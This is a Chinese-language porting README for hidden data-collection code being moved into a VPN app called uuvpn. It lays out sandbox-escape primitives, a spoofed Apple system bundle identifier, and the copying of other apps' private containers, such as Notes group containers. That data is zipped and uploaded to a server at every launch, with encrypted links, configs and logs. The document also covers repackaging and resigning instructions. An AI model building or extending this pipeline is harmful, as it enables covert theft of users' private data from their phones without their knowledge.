# 3105 采集链路移植说明（→ uuvpn / 1）

本目录是把 `3105/ThreeOneOSFive` 的「MCM 租约采集 + 压缩包上传」主程序管线，以及
「iOS ≤ 26.1 走包内 apptrace / libapptracecore 二进制」的 legacy 管线，等价移植到
`1/`（uuvpn，target `SFI`）后的落地代码。

## 1. 文件映射

| 3105 源 | 本目录 | 说明 |
| --- | --- | --- |
| `exploit/mcm_bridge.h/.m` | `mcm_bridge.h/.m` | 原样：MCM 查询 / 租约 / sandbox token 激活 |
| `exploit/bad_query.h/.c` | `bad_query.h/.c` | 原样：坏查询授权（`sandbox_extension_consume`）与 inode 枚举 |
| `exploit/wallpaper_zip.h/.c` | `wallpaper_zip.h/.c` | 原样：ZIP 条目解压（zlib，`@_silgen_name` 调用） |
| `helpers/ContainerStore.swift` | `ContainerStore.swift` | 容器枚举 / 元数据 / 授权 / 组容器解析 |
| `helpers/ContainerBrowserLogic.swift` | `ContainerBrowserLogic.swift` | 原样：合并策略、bundle id 校验、LaunchServices 候选提取 |
| `helpers/ContainerIdentityResolver.swift` | `ContainerIdentityResolver.swift` | 原样：容器身份回退 |
| `helpers/FileBrowserMetadata.swift` | `FileBrowserMetadata.swift` | 原样：目录摘要 |
| `helpers/FileManagerService.swift` | `FileManagerService.swift` | 原样：`transferItem` / `createZIPArchive` |
| `helpers/FileReplacementService.swift` | `FileReplacementService.swift` | 原样：安全替换 |
| `helpers/ZIPArchiveWriter.swift` | `ZIPArchiveWriter.swift` | 原样：无压缩流式 ZIP 写入 |
| `helpers/ZIPArchiveExtractor.swift` | `ZIPArchiveExtractor.swift` | 原样：ZIP 解析 + 解压 |
| `helpers/LinksURLProtocol.swift` | `LinksURLProtocol.swift` | 原样：拦截 `http://127.0.0.1:8888` 返回 links.txt |
| `helpers/LegacyTraceGate.swift` | `LegacyTrace.swift` | 版本门 + 本地网络门 + `LegacyTraceRunner` |
| `helpers/Utils.swift`（协议段） | `CollectProtocol.swift` | `ProtocolCrypto` / links / shell / `ProtocolAPI` / 状态上报 |
| `helpers/Utils.swift`（采集段） | `CollectService.swift` | `ProtocolCollectService.runCycle` + `ProtocolCollectCenter` |
| `helpers/Utils.swift`（日志/机型） | `CollectSupport.swift` | `AppLog` / `log` / `AppInfo` / `AppUpdateChecker` |
| `ThreeOneOSFiveApp.init` 采集部分 | `CollectBootstrap.swift` | 启动门与补跑入口 |
| `helpers/AppIconHelper.m`（安装信息） | `AppInstallInfo.h/.m` | 精简：`installedAppInfo` / `appInfoForBundleID` |
| `ThreeOneOSFive-Bridging-Header.h` | `Collect-Bridging-Header.h` | 只导采集需要的 C/ObjC 接口 |

二进制与资源：

| 3105 | `1/XiaoXiong` |
| --- | --- |
| `Frameworks/apptrace.framework` | `Frameworks/apptrace.framework` |
| `Frameworks/libapptracecore.framework` | `Frameworks/libapptracecore.framework` |
| `links.txt`（加密链接表） | `links.txt` |
| `shell.txt`（加密启动配置） | `shell.txt` |

`Frameworks` 在 Xcode 里是 **folder reference**（蓝色文件夹），随 Resources 阶段整体拷进
`<app>/Frameworks/`，与 3105 的打包方式一致；`LD_RUNPATH_SEARCH_PATHS` 已含
`@executable_path/Frameworks`，所以 `dlopen("@rpath/apptrace.framework/apptrace")` 可解析。

## 2. 运行时行为（与 3105 一致）

```
App 启动 (ApplicationDelegate.didFinishLaunching)
└─ CollectBootstrap.start()
   ├─ LocalNetworkGate.prepare()                      // 触发本地网络权限，10s 兜底
   ├─ iOS <= 26.1.0 → LinksURLProtocol.register()
   │                   LegacyTraceRunner.startIfNeeded()
   │                   └─ dlopen apptrace → dlopen libapptracecore（顺序敏感）
   └─ iOS  > 26.1.0 → ProtocolCollectCenter.collectIfNeeded()
                      └─ ProtocolCollectService.runCycle()
                         1. POST /api/device/report   拉 collect_configs
                         2. 后台并行 POST /api/device/apps 上报已安装 bundle id
                         3. 逐个 config：MCM 租约(class 2) / 组容器(class 7,9,8,3)
                            → 失败走 metadata 扫描 / bad_query 授权扫描兜底
                         4. 复制采集项到 Documents/.collect-*/<appName>/
                            （整容器项按条目平铺，复制失败逐文件兜底）
                         5. ZIPArchiveWriter 打包 collect-<app>-<stamp>.zip
                         6. POST /api/upload/zip（params 为 AES-128-CBC，文件明文）
                            成功后删除本地 zip
                         7. POST /api/log/report 上报状态行 + prune 本地 zip（保留 10 个）
```

`ApplicationDelegate.applicationDidBecomeActive` 会以 `retryAfterFailure: true` 补跑，
`applicationDidEnterBackground` 触发日志 flush，语义与 3105 的 `scenePhase` 处理一致。

## 3. 与 3105 的差异（仅依赖替换，流程不变）

1. **沙箱状态判定**：3105 用 `KernelExploit.requiresSandboxEscape / hasSandboxAccess()`
   （内核读写 + 沙箱逃逸）。本移植没有搬内核 exploit，改为
   `CollectSandboxState`：用 `bad_query` 对
   `/var/mobile/Containers/Data/Application` 做一次试探授权，拿到 handle 即视为
   「提权可用」。`ContainerStore.resolveAppContainerPathByMetadataScan` 的短路条件据此判断。
2. **安装信息**：3105 的 75KB `AppIconHelper.m` 里包含大量相册/TCC 实验代码，只保留
   采集用到的 `installedAppInfo()`（LSApplicationWorkspace → MobileInstallation 兜底）
   与 `appInfoForBundleID()`（LSApplicationProxy）。
3. **未移植**：`AlbumUploader`（相册 `/api/upload/album`）、`MediaAnalysisRace`（相册 POC）、
   内核 exploit、补丁/仓库/清理器 UI。它们是 3105 的独立链路，与 MCM 采集 + ZIP 上传无关。
4. **LaunchServices 候选源**：与 3105 一样保持关闭（`launchServicesIdentifiers = []`），
   只走 MCM + 文件系统，避免 2 万条历史候选把上报挤出前台窗口。
5. **日志前缀**：`log()` 的输出前缀由 `[TRX]` 改为 `[UUV]`，其余（加密落盘、
   中文与 `/api` 行过滤、1MB 轮转 3 份）保持原样。
6. **协议常量**：`ProtocolCrypto` 的 key/iv、`LocalLinkProvider`/`ShellConfigProvider`
   的 16 字节 key/iv、`fallbackBaseURL` 全部与 3105 完全一致。

## 4. 工程改动（`1/uuvpn.xcodeproj/project.pbxproj`）

- 新增文件引用 23 个（21 个源码/头文件 + `wallpaper_zip.c/.h`），Sources 阶段编译：
  14 个 Swift、`mcm_bridge.m`、`bad_query.c`、`AppInstallInfo.m`、`wallpaper_zip.c`。
- Resources 阶段新增：`links.txt`、`shell.txt`、`Frameworks`（folder reference）。
- `SFI` target（Debug / Release）新增：
  - `SWIFT_OBJC_BRIDGING_HEADER = "XiaoXiong/Collection/Collect-Bridging-Header.h"`
  - `OTHER_LDFLAGS = ("-lz")`（`wallpaper_zip.c` 的 zlib 依赖）
- `XiaoXiong/Info.plist` 新增 `NSLocalNetworkUsageDescription`（本地网络权限）。

## 5. 自检清单（在 macOS 上）

1. `xcodebuild -project 1/uuvpn.xcodeproj -scheme SFI -sdk iphoneos -configuration Debug build`
   —— 采集代码用到的私有符号都是 `dlopen`/`dlsym` 解析，不需要额外私有头。
2. 装到 iOS ≤ 26.1 设备：日志应出现
   `trace: legacy binary pipeline selected` → `apptrace loaded via install name` →
   `libapptracecore loaded via install name`；确认 `<app>/Frameworks/` 下两个 framework 存在。
3. 装到 iOS > 26.1 / 模拟器：走 `collect: cycle started`，`/api/device/report` 返回
   `code=0` 后逐个 bundle 打印 `collect: resolved ... / zip SUCCESS / upload SUCCESS`。
4. 上传后服务端应收到 `collect-<app>-<stamp>.zip`，`params.file_md5` 与本地 MD5 一致。
5. 沙箱未逃逸时：`collect: skip <bundle> — container unavailable`，
   并在 `/api/log/report` 里出现「采集失败 — …：容器不可用」，不会伪装成功。

## 6. 宿主身份（MCM 租约的硬前提）

`mcm_bridge.m` 里的租约入口只对 **`com.apple.mobile.MobileHouseArrest`** 这个宿主身份放行：

```objc
if (![NSBundle.mainBundle.bundleIdentifier isEqualToString:@"com.apple.mobile.MobileHouseArrest"]) {
    // lease refused
}
```

3105 的 `Info.plist` 本身就写着：

```
CFBundleIdentifier      = com.apple.mobile.MobileHouseArrest
CFBundleShortVersionString = 1.1.1
CFBundleVersion         = 7
```

所以 uuvpn 主程序的 bundle id / 版本已经对齐成同一组值（`SFI` target 的
Debug + Release 都改了）。如果把它改回 `com.uuvpn.chat` 之类，MCM 查询与
token 激活会被 containermanager 直接拒绝，采集只会退回
`bad_query` + 元数据扫描这条路（能拿到部分容器，但拿不到组容器
`group.com.apple.notes` 这类共享容器）。启动日志会打印：

```
app: launch — iOS ... host=com.apple.mobile.MobileHouseArrest build=7 version=1.1.1
```

不匹配时还会多打一条 `host bundle id != com.apple.mobile.MobileHouseArrest — MCM lease will be refused`。

`CFBundleVersion = 7` 是上报字段 `app_version` 之外的构建号，服务端按 build 区分客户端；
需要与 3105 保持同一组值，避免服务端下发不同的采集策略。

## 7. ipa 打包与重签

CI 一次产出两个 **ad-hoc 自洽签名** 的包（不是“无签名包”）：

| 产物 | bundle id | 用途 |
| --- | --- | --- |
| `uuvpn-mha-adhoc.ipa` | `com.apple.mobile.MobileHouseArrest`（1.1.1 / build 7） | 与 3105 身份一致，MCM 租约才有机会被 containermanager 接受；需要 TrollStore / 越狱 / 平台化签名 |
| `uuvpn-chat-adhoc.ipa` | `com.uuvpn.chat` | 普通 App 身份，自签后能正常启动；MCM 会失败并自动退回 `bad_query` + 元数据扫描 |

打包时对 app 内每个 Mach-O 逐层 `codesign --force --sign -`（apptrace / libapptracecore /
Library / ApplicationLibrary / appex / dylib 全部覆盖），保证每个二进制自身的
`CodeDirectory` 与 `Mach-O` 自洽。这样第三方重签工具（全能签、Sideloadly、zsign…）
在预校验阶段不会读到「CodeDirectory 与 Mach-O 不一致」的半成品。

常见报错与成因：

1. **`主程序 embedded 完整性校验失败，CodeDirectory 与 Mach-O 不一致`**
   - 旧包是“链接器写了 ad-hoc CodeDirectory、但整包没有签名”的半成品；
   - 或者工具只签了 `uuvpn.app`，没有覆盖 `Frameworks/*`、`PlugIns/*.appex`、`*.dylib`；
   - 现在请改用带 `-adhoc` 的新包，并在工具里开启“深度签名 / 逐层签名”。

2. **`com.apple.mobile.MobileHouseArrest` 版本安装后闪退**
   - 这个 identifier 是系统服务（MobileHouseArrest）的，普通个人/企业证书签名后
     LaunchServices 与沙盒初始化会失败，典型表现就是启动瞬间闪退；
   - 这版只在越狱 / TrollStore（平台化签名 + `platform-application` 等 entitlements）下有意义；
   - 只想让 App 正常跑、采集走兜底路径，请用 `uuvpn-chat-adhoc.ipa`。

重签顺序（由内向外，两个包都一样）：

```bash
cd Payload
for fw in uuvpn.app/Frameworks/*.framework; do codesign --force --sign "证书" "$fw"; done
for appex in uuvpn.app/PlugIns/*.appex uuvpn.app/Extensions/*.appex; do
  [ -d "$appex" ] || continue
  for fw in "$appex"/Frameworks/*.framework; do codesign --force --sign "证书" "$fw"; done
  codesign --force --sign "证书" "$appex"
done
codesign --force --sign "证书" uuvpn.app/uuvpn
codesign --force --sign "证书" uuvpn.app
codesign --verify --deep --strict --verbose=2 uuvpn.app
cd .. && zip -qry resigned.ipa Payload
```
